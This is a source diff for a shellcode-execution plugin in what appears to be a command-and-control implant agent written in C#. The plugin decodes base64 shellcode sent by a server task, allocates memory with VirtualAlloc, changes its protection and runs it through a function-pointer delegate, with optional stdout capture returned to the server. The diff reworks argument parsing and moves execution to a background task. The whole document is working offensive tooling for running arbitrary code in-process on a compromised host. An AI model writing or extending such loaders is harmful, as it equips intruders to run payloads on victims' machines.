@@ -6,6 +6,7 @@ using System.Net.NetworkInformation;
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
+using System.Text.Json;
 
 namespace Agent
 {
@@ -32,6 +33,7 @@ namespace Agent
         private delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         private IMessageManager messageManager { get; set; }
         private ITokenManager tokenManager { get; set; }
+        private string output_task_id { get; set; }
 
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
         {
@@ -40,12 +42,21 @@ namespace Agent
         }
         public async Task Execute(ServerJob job)
         {
-            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
-            bool output = false;
+            ShellcodeArgs args = JsonSerializer.Deserialize<ShellcodeArgs>(job.task.parameters);
 
-            bool.TryParse(args["get_output"], out output);
+            if (!args.Validate())
+            {
+                await messageManager.AddResponse(new ResponseResult()
+                {
+                    completed = true,
+                    user_output = "Missing Shellcode Bytes",
+                    task_id = job.task.id,
+                    status = "success"
+                });
+                return;
+            }
 
-            if (messageManager.StdIsBusy() && output)
+            if (messageManager.StdIsBusy() && args.output)
             {
                 await messageManager.AddResponse(new ResponseResult()
                 {
@@ -57,7 +68,19 @@ namespace Agent
                 return;
             }
 
-            byte[] buffer = Convert.FromBase64String(args["buffer"].ToString());
+            if (!messageManager.CaptureStdOut(job.task.id) && args.output)
+            {
+                await messageManager.AddResponse(new ResponseResult()
+                {
+                    completed = true,
+                    process_response = new Dictionary<string, string> { { "message", "0x20" } },
+                    task_id = job.task.id,
+                    status = "success"
+                });
+                return;
+            }
+
+            byte[] buffer = Convert.FromBase64String(args.asm);
 
             //Allocate shellcode as RW
             IntPtr bufAddr = Native.VirtualAlloc(IntPtr.Zero, (uint)buffer.Length, 0x1000, 0x04);
@@ -92,56 +115,84 @@ namespace Agent
             // Create a delegate to the shellcode
             BufferDelegate shellcodeDelegate = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(bufAddr, typeof(BufferDelegate));
 
-            if (output)
+            if (args.output)
             {
-                if (!messageManager.CaptureStdOut(args["task-id"]))
+                output_task_id = job.task.id;
+#pragma warning disable CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
+                Task.Run(() =>
                 {
-                    await messageManager.AddResponse(new ResponseResult()
+                    using(var redirector = new ConsoleWriter())
                     {
-                        completed = true,
-                        process_response = new Dictionary<string, string> { { "message", "0x20" } },
-                        task_id = args["task-id"],
-                        status = "success"
-                    });
-                    return;
-                }
-            }
-            await messageManager.AddResponse(new ResponseResult()
-            {
-                completed = false,
-                process_response = new Dictionary<string, string> { { "message", "0x44" } },
-                task_id = job.task.id,
-                status = "success"
-            });
+                        redirector.WriteLineEvent += Redirector_WriteLineEvent;
+                        redirector.WriteEvent += Redirector_WriteEvent;
+                        try
+                        {
+                            shellcodeDelegate.Invoke();
+                            messageManager.AddResponse(new ResponseResult()
+                            {
+                                completed = false,
+                                process_response = new Dictionary<string, string> { { "message", "0x44" } },
+                                task_id = job.task.id,
+                                status = "success"
+                            });
+                        }
+                        catch
+                        {
+                            messageManager.AddResponse(new ResponseResult()
+                            {
+                                completed = false,
+                                process_response = new Dictionary<string, string> { { "message", "0x44" } },
+                                task_id = job.task.id,
+                                status = "error"
+                            });
+                        }
+                        redirector.WriteLineEvent -= Redirector_WriteLineEvent;
+                        redirector.WriteEvent -= Redirector_WriteEvent;
+                        messageManager.ReleaseStdOut();
 
-            // Execute the shellcode using the delegate
-            try
-            {
-                shellcodeDelegate.Invoke();
-            }
-            catch (Exception e)
-            {
-                await messageManager.AddResponse(new ResponseResult()
-                {
-                    completed = true,
-                    user_output = $"Error in buffer: {e.ToString()}\r\nWin32: {Marshal.GetLastPInvokeError()}",
-                    task_id = job.task.id,
-                    status = "success"
+                    }
+                    output_task_id = String.Empty;
                 });
+#pragma warning restore CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
             }
-
-            if (output)
-            {
-                messageManager.ReleaseStdOut();
+            else {
+                //Run withotu catching output
+#pragma warning disable CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
+                Task.Run(() => {
+                    try
+                    {
+                        shellcodeDelegate.Invoke();
+                        messageManager.AddResponse(new ResponseResult()
+                        {
+                            completed = false,
+                            process_response = new Dictionary<string, string> { { "message", "0x44" } },
+                            task_id = job.task.id,
+                            status = "success"
+                        });
+                    }
+                    catch
+                    {
+                        messageManager.AddResponse(new ResponseResult()
+                        {
+                            completed = false,
+                            process_response = new Dictionary<string, string> { { "message", "0x44" } },
+                            task_id = job.task.id,
+                            status = "error"
+                        });
+                    }
+                });
+#pragma warning restore CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
             }
+        }
 
-            await messageManager.AddResponse(new ResponseResult()
-            {
-                completed = true,
-                process_response = new Dictionary<string, string> { { "message", "0x35" } },
-                task_id = job.task.id,
-                status = "success"
-            });
+        private void Redirector_WriteEvent(object? sender, ConsoleWriterEventArgs e)
+        {
+            messageManager.Write(e.Value, this.output_task_id, false);
+        }
+
+        private void Redirector_WriteLineEvent(object? sender, ConsoleWriterEventArgs e)
+        {
+            messageManager.WriteLine(e.Value, this.output_task_id, false);
         }
     }
 }
